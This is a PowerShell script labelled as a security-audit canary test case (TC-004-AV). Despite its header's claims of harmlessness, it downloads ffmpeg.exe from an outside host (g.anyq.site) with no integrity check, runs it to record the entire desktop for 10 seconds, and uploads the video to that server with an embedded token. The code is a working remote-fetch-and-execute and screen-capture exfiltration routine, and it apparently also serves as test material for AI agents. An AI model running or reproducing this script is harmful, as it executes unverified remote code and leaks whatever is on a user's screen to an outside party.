# SECURITY AUDIT ONLY - TC-004-AV capture-10s variant
# DEDICATED ISOLATED VM ONLY. Downloads the open-source FFmpeg static build
# (single ffmpeg.exe) from this project's fixed endpoint, performs ONE real
# real-time desktop capture of exactly 10 seconds (-t 10), then stops and
# uploads the MP4 + receipt to the server. No persistence, no loop, no
# keylogging, no remote control, no privilege escalation. The one-purpose
# upload token is embedded at generation time (__UPLOAD_TOKEN__).

[CmdletBinding()]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$uploadToken = '__UPLOAD_TOKEN__'
$artBase = 'https://g.anyq.site/integrity-lab/artifacts'
$uploadUri = 'https://g.anyq.site/integrity-lab/api/canary/video-upload'
$labRoot = Join-Path $env:USERPROFILE 'AIIntegrityLab'
$ff = Join-Path $labRoot 'ffmpeg.exe'
$durationSeconds = 10
$framerate = 10
New-Item -ItemType Directory -Force -Path $labRoot | Out-Null

function Get-Sha256Text {
    param([string]$Path)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $hash = $sha.ComputeHash([System.IO.File]::ReadAllBytes($Path))
        return ([System.BitConverter]::ToString($hash)).Replace('-', '').ToLowerInvariant()
    } finally { $sha.Dispose() }
}

function Upload-Video {
    param([string]$Path, [string]$CanaryId, [string]$Token, [string]$Uri)
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $request = [System.Net.HttpWebRequest]::Create($Uri)
    $request.Method = 'POST'
    $request.ContentType = 'video/mp4'
    $request.Headers.Add('X-AI-Canary-Id', $CanaryId)
    $request.Headers.Add('X-AI-Canary-Token', $Token)
    $request.Timeout = 120000
    $stream = $request.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $request.GetResponse()
    $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
    $json = $reader.ReadToEnd()
    $reader.Close()
    $response.Close()
    if ($json -match '"sha256"\s*:\s*"([0-9a-fA-F]{64})"') {
        return $matches[1].ToLowerInvariant()
    }
    return ''
}

# 1) fetch the open-source FFmpeg static build if not present (fixed endpoint only)
if (-not (Test-Path -LiteralPath $ff)) {
    & curl.exe -L -s -o $ff "$artBase/ffmpeg.exe"
}
if (-not (Test-Path -LiteralPath $ff)) { throw 'FFmpeg download failed' }

# 2) one real desktop capture, exactly 10 seconds, then stops automatically
$canaryId = 'CANARY-' + ([Guid]::NewGuid().ToString('N').Substring(0, 12).ToUpperInvariant())
$outputPath = Join-Path $labRoot ($canaryId + '.mp4')
& $ff -y -loglevel error -f gdigrab -framerate $framerate -i desktop -t $durationSeconds -c:v libx264 -preset ultrafast -pix_fmt yuv420p $outputPath
if (-not (Test-Path -LiteralPath $outputPath)) { throw 'Capture failed (no output file)' }
$size = (Get-Item -LiteralPath $outputPath).Length
if ($size -lt 1024) { throw "Capture too small: $size bytes" }

# 3) upload MP4 + receipt
$localSha256 = Get-Sha256Text -Path $outputPath
$serverSha256 = Upload-Video -Path $outputPath -CanaryId $canaryId -Token $uploadToken -Uri $uploadUri
if ($serverSha256 -ne $localSha256) { throw 'Server video receipt hash mismatch.' }

[pscustomobject]@{
    case_id = 'TC-004-AV'
    canary_id = $canaryId
    local_path = $outputPath
    local_sha256 = $localSha256
    server_sha256 = $serverSha256
    duration_seconds = $durationSeconds
    framerate = $framerate
    bytes = $size
} | ConvertTo-Json -Compress
